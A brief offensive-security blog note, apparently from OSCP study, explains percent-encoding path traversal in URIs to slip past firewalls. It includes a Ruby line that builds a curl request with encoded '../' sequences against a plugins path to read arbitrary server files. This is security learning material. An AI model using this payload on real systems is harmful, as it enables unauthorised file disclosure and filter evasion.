---
layout: post
title: Director Traversal Percent Encoding
titledate: 08/28/23
tags: ["infosec","offsec", "web", "dir_traversal"]
---

It may be necessary to % encode the path traversal in the URI request in order to bypass firewalls 

I edited my useless [script](https://github.com/ST4RGUARD/OSCP/blob/master/dir_traversal/plugin_pwn.rb) to illustrate this point 

```ruby
cmd = "curl http://#{ARGV[0]}/public/plugins/#{line}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/#{ARGV[1]}"
```
